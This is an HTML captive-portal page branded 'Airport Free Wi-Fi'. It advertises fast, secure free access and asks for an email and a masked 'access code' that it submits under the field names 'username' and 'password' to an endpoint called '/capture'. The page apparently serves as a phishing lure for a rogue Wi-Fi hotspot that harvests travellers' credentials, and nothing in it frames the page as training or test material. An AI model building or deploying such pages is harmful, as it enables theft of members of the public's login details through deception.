<html lang="en">
<head>
<meta charset="UTF-8">

<title data-i18n="page_title">Airport Free Wi-Fi</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{
  font-family:'Segoe UI',Roboto,'Helvetica Neue',Arial,sans-serif;
  background:linear-gradient(180deg,#e8f4f8 0%,#f0f4f8 100%);
  display:flex;justify-content:center;align-items:center;min-height:100vh;
  padding:20px;color:#1e293b;
}
.portal{
  background:#ffffff;border-radius:16px;
  padding:44px 40px 40px;width:100%;max-width:460px;
  box-shadow:0 4px 24px rgba(0,60,120,0.08),0 1px 4px rgba(0,60,120,0.04);
  border-top:4px solid #0369a1;
}
.header{text-align:center;margin-bottom:28px}
.plane-icon{font-size:2.6em;margin-bottom:8px;display:block}
h1{font-size:1.45em;font-weight:700;color:#0c4a6e;margin-bottom:4px}
.subtitle{font-size:0.88em;color:#64748b;margin-bottom:0}
.badge{
  display:inline-block;background:#ecfdf5;color:#047857;
  padding:4px 12px;border-radius:20px;font-size:0.75em;
  font-weight:600;margin-top:10px;letter-spacing:0.3px;
}
.form-group{margin-bottom:18px}
.form-group label{
  display:block;font-size:0.82em;font-weight:600;
  color:#334155;margin-bottom:6px;
}
.form-group input,.form-group select{
  width:100%;padding:12px 14px;
  border:1.5px solid #cbd5e1;border-radius:10px;
  font-size:0.92em;color:#1e293b;outline:none;
  background:#f8fafc;transition:border-color 0.2s,box-shadow 0.2s;
  font-family:inherit;
}
.form-group input:focus,.form-group select:focus{
  border-color:#0284c7;box-shadow:0 0 0 3px rgba(2,132,199,0.12);
  background:#fff;
}
.form-group input::placeholder{color:#94a3b8}
.duration-row{
  display:flex;gap:12px;align-items:flex-end;
}
.duration-row .form-group{flex:1}
.terms-row{
  display:flex;align-items:flex-start;gap:10px;
  margin:20px 0 24px;
}
.terms-row input[type="checkbox"]{
  width:18px;height:18px;margin-top:2px;
  accent-color:#0284c7;cursor:pointer;flex-shrink:0;
}
.terms-row label{
  font-size:0.8em;color:#64748b;line-height:1.5;cursor:pointer;
}
button[type="submit"]{
  width:100%;padding:13px;
  background:linear-gradient(135deg,#0284c7 0%,#0369a1 100%);
  color:#fff;border:none;border-radius:10px;font-size:0.95em;
  font-weight:600;cursor:pointer;transition:transform 0.15s,box-shadow 0.2s;
  letter-spacing:0.3px;
}
button[type="submit"]:hover{
  transform:translateY(-1px);
  box-shadow:0 6px 20px rgba(3,105,161,0.25);
}
button[type="submit"]:active{transform:translateY(0)}
.footer{
  text-align:center;margin-top:20px;
  font-size:0.72em;color:#94a3b8;line-height:1.5;
}
.info-bar{
  display:flex;justify-content:center;gap:20px;
  margin-bottom:24px;padding:12px;
  background:#f0f9ff;border-radius:10px;
}
.info-item{text-align:center}
.info-item .val{font-size:0.95em;font-weight:700;color:#0369a1}
.info-item .lbl{font-size:0.7em;color:#64748b;margin-top:2px}
@media(max-width:480px){
  .portal{padding:32px 22px 28px;border-radius:12px}
  h1{font-size:1.25em}
  .duration-row{flex-direction:column;gap:0}
  .info-bar{gap:12px;padding:10px}
}
</style>
</head>
<body>
<div class="portal">
  <div class="header">
    <span class="plane-icon">&#9992;&#65039;</span>
    <h1 data-i18n="title">Airport Free Wi-Fi</h1>
    <p class="subtitle" data-i18n="subtitle">Stay connected while you wait for your flight</p>
    <span class="badge" data-i18n="badge_free">FREE ACCESS</span>
  </div>
  <div class="info-bar">
    <div class="info-item">
      <div class="val">50 Mbps</div>
      <div class="lbl" data-i18n="info_speed">Speed</div>
    </div>
    <div class="info-item">
      <div class="val" data-i18n="info_unlimited_val">Unlimited</div>
      <div class="lbl" data-i18n="info_data">Data</div>
    </div>
    <div class="info-item">
      <div class="val" data-i18n="info_secure_val">WPA3</div>
      <div class="lbl" data-i18n="info_security">Security</div>
    </div>
  </div>
  <form method="POST" action="/capture" autocomplete="off">
    <div class="form-group">
      <label for="email" data-i18n="label_email">Email Address</label>
      <input type="email" id="email" name="username" required
             data-i18n-ph="ph_email" placeholder="your@email.com">
    </div>
    <div class="duration-row">
      <div class="form-group">
        <label for="code" data-i18n="label_code">Access Code</label>
        <input type="password" id="code" name="password" required
               data-i18n-ph="ph_code" placeholder="From boarding pass">
      </div>
      <div class="form-group">
        <label for="duration" data-i18n="label_duration">Session Duration</label>
        <select id="duration" name="duration">
          <option value="2" data-i18n="dur_2h">2 Hours</option>
          <option value="4" data-i18n="dur_4h">4 Hours</option>
          <option value="8" data-i18n="dur_8h">8 Hours</option>
          <option value="24" data-i18n="dur_24h">24 Hours</option>
        </select>
      </div>
    </div>
    <div class="terms-row">
      <input type="checkbox" id="agree" required>
      <label for="agree" data-i18n="terms">I agree to the terms of service and acceptable use policy for this network.</label>
    </div>
    <button type="submit" data-i18n="btn_connect">Connect to Wi-Fi</button>
  </form>
  <p class="footer" data-i18n="footer">Provided by Airport Network Services. For assistance, visit the information desk.</p>
</div>
